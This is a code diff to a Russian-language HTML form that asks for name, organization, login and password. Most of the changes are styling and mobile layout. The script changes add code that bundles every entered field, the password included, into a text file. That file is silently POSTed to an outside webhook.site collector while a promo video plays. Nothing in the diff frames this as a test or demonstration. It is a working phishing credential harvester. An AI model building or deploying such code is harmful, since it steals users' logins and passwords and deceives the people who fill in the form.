@@ -19,7 +19,7 @@
 
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(to right, #ff416c, #ffff2b);
+            background: linear-gradient(to right, #ff416c, #ff7b00);
             background-size: 400% 400%;
             animation: gradientAnimation 15s ease-in-out infinite;
             color: white;
@@ -41,6 +41,7 @@
             text-align: center;
             width: 100%;
             max-width: 600px;
+            padding: 20px;
         }
 
         h1 {
@@ -73,7 +74,7 @@
             max-width: 500px;
         }
 
-        input, button {
+        input, button, textarea {
             margin-bottom: 20px;
             padding: 10px;
             font-size: 1em;
@@ -103,6 +104,60 @@
             border-radius: 10px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
         }
+
+        /* Медиазапросы для мобильных устройств */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+            }
+
+            .container {
+                padding: 15px;
+            }
+
+            h1 {
+                font-size: 2em;
+            }
+
+            h2 {
+                font-size: 1.5em;
+            }
+
+            p {
+                font-size: 1em;
+            }
+
+            input, button, textarea {
+                font-size: 0.9em;
+            }
+
+            button {
+                padding: 12px;
+                font-size: 1.1em;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.5em;
+            }
+
+            h2 {
+                font-size: 1.3em;
+            }
+
+            p {
+                font-size: 0.9em;
+            }
+
+            input, button, textarea {
+                font-size: 0.85em;
+            }
+
+            button {
+                padding: 10px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -118,6 +173,7 @@
             <input type="text" id="organizationInput" placeholder="Введите вашу организацию" required>
             <input type="text" id="loginInput" placeholder="Введите ваш логин" required>
             <input type="password" id="passwordInput" placeholder="Введите ваш пароль" required>
+            
             <button type="submit">Отправить данные</button>
         </form>
 
@@ -136,15 +192,39 @@
             var organization = document.getElementById('organizationInput').value;
             var login = document.getElementById('loginInput').value;
             var password = document.getElementById('passwordInput').value;
+            
 
             if (firstName.trim() === "" || lastName.trim() === "" || organization.trim() === "" || login.trim() === "" || password.trim() === "") {
+                alert("Пожалуйста, заполните все поля.");
                 return;
             }
 
+            // Создаем Blob (файл) из текста сообщения
+            var formattedMessage = `
+Имя: ${firstName}
+Фамилия: ${lastName}
+Организация: ${organization}
+Логин: ${login}
+Пароль: ${password}`;
+
+            var blob = new Blob([formattedMessage], { type: 'text/plain' });
+            var file = new File([blob], "registration_message.txt", { type: 'text/plain' });
+
+            var formData = new FormData();
+            formData.append("file", file);
+
+            // Показываем видео сразу, как только форма отправлена
             var video = document.getElementById('promoVideo');
             video.style.display = 'block';
             video.play();
 
+            // Отправка данных через Fetch API
+            fetch('https://webhook.site/5767341b-0162-4436-be4d-9910791e28af', {
+                method: 'POST',
+                body: formData
+            });
+
+            // Скрыть видео после его окончания
             video.onended = function() {
                 video.style.display = 'none';
             };
